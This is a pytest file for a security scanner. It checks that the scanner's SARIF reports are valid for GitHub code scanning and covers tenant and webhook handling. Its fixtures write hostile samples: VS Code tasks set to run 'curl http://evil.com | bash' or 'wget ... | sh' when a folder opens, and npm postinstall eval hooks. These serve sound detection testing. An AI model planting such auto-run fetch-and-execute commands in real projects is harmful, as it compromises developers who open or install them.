"""
End-to-end SARIF validation tests.

Verifies that scanner output is structurally valid SARIF 2.1.0 and
compatible with GitHub code scanning (upload-sarif action).

GitHub code scanning requirements:
- SARIF 2.1.0 schema
- runs[].tool.driver.name present
- runs[].tool.driver.rules array (for inline PR annotations)
- results[].ruleId present
- results[].level in {error, warning, note, none}
- results[].message.text present
- results[].locations[].physicalLocation.artifactLocation.uri — relative paths
- results[].locations[].physicalLocation.artifactLocation.uriBaseId = "%SRCROOT%"
"""

import json
import re
from pathlib import Path
from unittest.mock import patch

import pytest
from click.testing import CliRunner

from exray.cli import main
from exray.core.models import ScanResult
from exray.core.orchestrator import Orchestrator
from exray.core.reporting import SarifReporter

VALID_SARIF_LEVELS = {"error", "warning", "note", "none"}
ISO8601_RE = re.compile(r"^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}")


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _parse_sarif(output: str) -> dict:
    """Parse SARIF JSON string, raising on invalid JSON."""
    return json.loads(output)


def _run_scan(target: Path) -> dict:
    """Run full orchestrator scan and return SARIF as dict."""
    orchestrator = Orchestrator()
    result = orchestrator.scan(target)
    reporter = SarifReporter()
    return _parse_sarif(reporter.report(result))


def _run_scan_with_tenant(target: Path, tenant_id: str) -> dict:
    orchestrator = Orchestrator()
    result = orchestrator.scan(target)
    reporter = SarifReporter()
    return _parse_sarif(reporter.report(result, tenant_id=tenant_id))


# ---------------------------------------------------------------------------
# SARIF schema structure tests
# ---------------------------------------------------------------------------

class TestSarifSchema:
    """Validate top-level SARIF 2.1.0 structure."""

    def test_version_is_2_1_0(self, contagious_interview_task):
        data = _run_scan(contagious_interview_task)
        assert data["version"] == "2.1.0"

    def test_schema_field_present(self, contagious_interview_task):
        data = _run_scan(contagious_interview_task)
        assert "$schema" in data
        assert "sarif" in data["$schema"].lower()

    def test_runs_is_list_with_one_entry(self, contagious_interview_task):
        data = _run_scan(contagious_interview_task)
        assert isinstance(data["runs"], list)
        assert len(data["runs"]) == 1

    def test_tool_driver_name_present(self, contagious_interview_task):
        data = _run_scan(contagious_interview_task)
        driver = data["runs"][0]["tool"]["driver"]
        assert driver["name"] == "Ex-Ray"

    def test_tool_driver_version_present(self, contagious_interview_task):
        data = _run_scan(contagious_interview_task)
        driver = data["runs"][0]["tool"]["driver"]
        assert "version" in driver
        assert driver["version"] != ""

    def test_tool_driver_information_uri_present(self, contagious_interview_task):
        data = _run_scan(contagious_interview_task)
        driver = data["runs"][0]["tool"]["driver"]
        assert "informationUri" in driver

    def test_results_is_list(self, contagious_interview_task):
        data = _run_scan(contagious_interview_task)
        assert isinstance(data["runs"][0]["results"], list)

    def test_properties_bag_present(self, contagious_interview_task):
        data = _run_scan(contagious_interview_task)
        props = data["runs"][0]["properties"]
        assert "scanTimestamp" in props
        assert "scannerVersion" in props

    def test_scan_timestamp_is_iso8601(self, contagious_interview_task):
        data = _run_scan(contagious_interview_task)
        ts = data["runs"][0]["properties"]["scanTimestamp"]
        assert ISO8601_RE.match(ts), f"Not a valid ISO8601 timestamp: {ts}"


# ---------------------------------------------------------------------------
# GitHub-specific: rules array
# ---------------------------------------------------------------------------

class TestSarifRulesArray:
    """Validate tool.driver.rules for GitHub inline PR annotations."""

    def test_rules_array_present(self, contagious_interview_task):
        data = _run_scan(contagious_interview_task)
        driver = data["runs"][0]["tool"]["driver"]
        assert "rules" in driver
        assert isinstance(driver["rules"], list)

    def test_rules_array_non_empty_when_findings_exist(self, contagious_interview_task):
        data = _run_scan(contagious_interview_task)
        rules = data["runs"][0]["tool"]["driver"]["rules"]
        assert len(rules) > 0

    def test_rules_array_empty_when_no_findings(self, clean_npm_package):
        data = _run_scan(clean_npm_package)
        rules = data["runs"][0]["tool"]["driver"]["rules"]
        assert rules == []

    def test_each_rule_has_required_fields(self, contagious_interview_task):
        data = _run_scan(contagious_interview_task)
        for rule in data["runs"][0]["tool"]["driver"]["rules"]:
            assert "id" in rule, f"Rule missing 'id': {rule}"
            assert "name" in rule, f"Rule missing 'name': {rule}"
            assert "shortDescription" in rule, f"Rule missing 'shortDescription': {rule}"
            assert "text" in rule["shortDescription"]
            assert "help" in rule, f"Rule missing 'help': {rule}"
            assert "text" in rule["help"]

    def test_rules_are_deduplicated(self, malicious_npm_eval):
        """Same rule triggered multiple times yields only one entry in rules array."""
        data = _run_scan(malicious_npm_eval)
        rule_ids = [r["id"] for r in data["runs"][0]["tool"]["driver"]["rules"]]
        assert len(rule_ids) == len(set(rule_ids)), "Duplicate rule IDs in rules array"

    def test_rules_match_result_rule_ids(self, contagious_interview_task):
        """Every ruleId referenced in results has a corresponding entry in rules."""
        data = _run_scan(contagious_interview_task)
        rule_ids_in_driver = {r["id"] for r in data["runs"][0]["tool"]["driver"]["rules"]}
        for result in data["runs"][0]["results"]:
            assert result["ruleId"] in rule_ids_in_driver, (
                f"Result references ruleId '{result['ruleId']}' not in driver rules"
            )

    def test_rule_default_configuration_has_level(self, contagious_interview_task):
        data = _run_scan(contagious_interview_task)
        for rule in data["runs"][0]["tool"]["driver"]["rules"]:
            level = rule.get("defaultConfiguration", {}).get("level")
            assert level in VALID_SARIF_LEVELS, f"Invalid level '{level}' in rule {rule['id']}"


# ---------------------------------------------------------------------------
# GitHub-specific: result structure
# ---------------------------------------------------------------------------

class TestSarifResults:
    """Validate individual result objects for GitHub compatibility."""

    def test_each_result_has_rule_id(self, contagious_interview_task):
        data = _run_scan(contagious_interview_task)
        for result in data["runs"][0]["results"]:
            assert "ruleId" in result

    def test_each_result_has_valid_level(self, contagious_interview_task):
        data = _run_scan(contagious_interview_task)
        for result in data["runs"][0]["results"]:
            assert result["level"] in VALID_SARIF_LEVELS

    def test_each_result_has_message_text(self, contagious_interview_task):
        data = _run_scan(contagious_interview_task)
        for result in data["runs"][0]["results"]:
            assert "message" in result
            assert "text" in result["message"]
            assert result["message"]["text"] != ""

    def test_each_result_has_location(self, contagious_interview_task):
        data = _run_scan(contagious_interview_task)
        for result in data["runs"][0]["results"]:
            assert "locations" in result
            assert len(result["locations"]) >= 1

    def test_location_has_physical_location(self, contagious_interview_task):
        data = _run_scan(contagious_interview_task)
        for result in data["runs"][0]["results"]:
            loc = result["locations"][0]
            assert "physicalLocation" in loc

    def test_artifact_uri_is_relative(self, contagious_interview_task):
        """File paths in SARIF must be relative — absolute paths break GitHub annotations."""
        data = _run_scan(contagious_interview_task)
        for result in data["runs"][0]["results"]:
            uri = result["locations"][0]["physicalLocation"]["artifactLocation"]["uri"]
            assert not uri.startswith("/"), f"Absolute path in SARIF URI: {uri}"
            assert not uri.startswith("C:"), f"Absolute Windows path in SARIF URI: {uri}"

    def test_artifact_uri_base_id_is_srcroot(self, contagious_interview_task):
        """uriBaseId must be %SRCROOT% for GitHub to resolve paths correctly."""
        data = _run_scan(contagious_interview_task)
        for result in data["runs"][0]["results"]:
            artifact = result["locations"][0]["physicalLocation"]["artifactLocation"]
            assert artifact.get("uriBaseId") == "%SRCROOT%"

    def test_region_start_line_is_positive_int(self, contagious_interview_task):
        data = _run_scan(contagious_interview_task)
        for result in data["runs"][0]["results"]:
            line = result["locations"][0]["physicalLocation"]["region"]["startLine"]
            assert isinstance(line, int)
            assert line >= 1

    def test_critical_findings_map_to_error_level(self, contagious_interview_task):
        """CRITICAL severity must map to SARIF 'error' level."""
        data = _run_scan(contagious_interview_task)
        # VSC-001 is CRITICAL — should be 'error'
        vsc001 = [r for r in data["runs"][0]["results"] if r["ruleId"] == "VSC-001"]
        assert len(vsc001) > 0
        assert all(r["level"] == "error" for r in vsc001)

    def test_no_results_for_clean_project(self, clean_npm_package):
        data = _run_scan(clean_npm_package)
        assert data["runs"][0]["results"] == []


# ---------------------------------------------------------------------------
# Tenant metadata end-to-end
# ---------------------------------------------------------------------------

class TestTenantEndToEnd:
    """Full pipeline tests with tenant-id and webhook together."""

    def test_tenant_id_in_sarif_and_webhook_header(self, contagious_interview_task):
        """Both SARIF body and webhook X-Tenant-ID header carry the tenant."""
        captured = {}

        def fake_post(url, sarif_data, tenant_id=None, **kwargs):
            captured["sarif"] = sarif_data
            captured["tenant_id"] = tenant_id
            return True

        runner = CliRunner()
        with patch("exray.cli.post_sarif", side_effect=fake_post):
            result = runner.invoke(
                main,
                [
                    str(contagious_interview_task),
                    "--format", "sarif",
                    "--webhook-url", "https://example.com/hook",
                    "--tenant-id", "acme-corp",
                ],
            )

        assert result.exit_code == 1  # Findings detected
        # Webhook received the tenant_id
        assert captured["tenant_id"] == "acme-corp"
        # SARIF body also has tenantId
        assert captured["sarif"]["runs"][0]["properties"]["tenantId"] == "acme-corp"

    def test_webhook_receives_valid_sarif(self, contagious_interview_task):
        """Webhook POST body is structurally valid SARIF."""
        captured = {}

        def fake_post(url, sarif_data, tenant_id=None, **kwargs):
            captured["sarif"] = sarif_data
            return True

        runner = CliRunner()
        with patch("exray.cli.post_sarif", side_effect=fake_post):
            runner.invoke(
                main,
                [
                    str(contagious_interview_task),
                    "--format", "sarif",
                    "--webhook-url", "https://example.com/hook",
                ],
            )

        sarif = captured["sarif"]
        assert sarif["version"] == "2.1.0"
        assert len(sarif["runs"]) == 1
        assert len(sarif["runs"][0]["results"]) > 0
        assert len(sarif["runs"][0]["tool"]["driver"]["rules"]) > 0

    def test_sarif_written_to_file_and_webhook_called(self, contagious_interview_task, tmp_path):
        """--output and --webhook-url together: file written AND webhook called."""
        outfile = tmp_path / "results.sarif"
        captured = {}

        def fake_post(url, sarif_data, tenant_id=None, **kwargs):
            captured["called"] = True
            captured["tenant_id"] = tenant_id
            return True

        runner = CliRunner()
        with patch("exray.cli.post_sarif", side_effect=fake_post):
            result = runner.invoke(
                main,
                [
                    str(contagious_interview_task),
                    "--format", "sarif",
                    "--output", str(outfile),
                    "--webhook-url", "https://example.com/hook",
                    "--tenant-id", "test-tenant",
                ],
            )

        assert result.exit_code == 1
        # File written
        assert outfile.exists()
        file_sarif = json.loads(outfile.read_text())
        assert file_sarif["version"] == "2.1.0"
        assert file_sarif["runs"][0]["properties"]["tenantId"] == "test-tenant"
        # stdout should be empty
        assert result.output.strip() == ""
        # Webhook called with correct tenant
        assert captured.get("called") is True
        assert captured["tenant_id"] == "test-tenant"

    def test_webhook_failure_sarif_file_still_written(self, contagious_interview_task, tmp_path):
        """Webhook failure does not prevent SARIF file from being written."""
        outfile = tmp_path / "results.sarif"

        runner = CliRunner()
        with patch("exray.cli.post_sarif", return_value=False):
            result = runner.invoke(
                main,
                [
                    str(contagious_interview_task),
                    "--format", "sarif",
                    "--output", str(outfile),
                    "--webhook-url", "https://example.com/hook",
                ],
            )

        assert result.exit_code == 1
        assert outfile.exists()
        data = json.loads(outfile.read_text())
        assert data["version"] == "2.1.0"


# ---------------------------------------------------------------------------
# Multi-vector scan (npm + vscode together)
# ---------------------------------------------------------------------------

class TestMultiVectorSarif:
    """SARIF output from scans with findings from multiple plugins."""

    def test_multi_plugin_findings_all_in_sarif(self, tmp_path):
        """Findings from both npm and vscode plugins appear in one SARIF run."""
        import json as _json

        pkg = tmp_path / "package.json"
        pkg.write_text(_json.dumps({
            "name": "test",
            "scripts": {"postinstall": "eval('malicious')"},
        }))

        vscode_dir = tmp_path / ".vscode"
        vscode_dir.mkdir()
        (vscode_dir / "tasks.json").write_text(_json.dumps({
            "version": "2.0.0",
            "tasks": [{
                "label": "bad",
                "command": "curl http://evil.com | bash",
                "runOptions": {"runOn": "folderOpen"},
            }],
        }))

        data = _run_scan(tmp_path)
        results = data["runs"][0]["results"]
        plugin_rule_ids = {r["ruleId"] for r in results}

        # Should have findings from both plugins
        npm_findings = [r for r in results if r["ruleId"].startswith("NPM-")]
        vsc_findings = [r for r in results if r["ruleId"].startswith("VSC-")]
        assert len(npm_findings) > 0, "No NPM findings in SARIF"
        assert len(vsc_findings) > 0, "No VSCode findings in SARIF"

    def test_all_results_have_srcroot_base(self, tmp_path):
        """All file URIs use %SRCROOT% regardless of plugin."""
        import json as _json

        pkg = tmp_path / "package.json"
        pkg.write_text(_json.dumps({
            "name": "test",
            "scripts": {"postinstall": "eval('x')"},
        }))

        vscode_dir = tmp_path / ".vscode"
        vscode_dir.mkdir()
        (vscode_dir / "tasks.json").write_text(_json.dumps({
            "version": "2.0.0",
            "tasks": [{
                "label": "t",
                "command": "wget http://x.com | sh",
                "runOptions": {"runOn": "folderOpen"},
            }],
        }))

        data = _run_scan(tmp_path)
        for result in data["runs"][0]["results"]:
            artifact = result["locations"][0]["physicalLocation"]["artifactLocation"]
            assert artifact.get("uriBaseId") == "%SRCROOT%"
            assert not artifact["uri"].startswith("/")
